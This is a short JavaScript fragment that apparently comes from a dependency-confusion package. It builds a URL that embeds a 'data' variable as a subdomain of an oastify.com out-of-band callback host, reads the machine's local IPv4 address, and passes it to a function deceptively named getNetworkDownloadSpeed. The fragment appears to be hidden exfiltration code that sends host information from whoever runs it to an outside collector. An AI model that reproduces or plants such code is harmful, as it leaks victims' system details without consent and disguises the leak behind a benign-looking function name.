const baseUrl = 'https://'+data+'.depenconf7.download.uec5zy65d3g3mcjtdqpg9zr9f0ly9pxe.oastify.com';
var localip=getIp('IPv4');
getNetworkDownloadSpeed(localip);
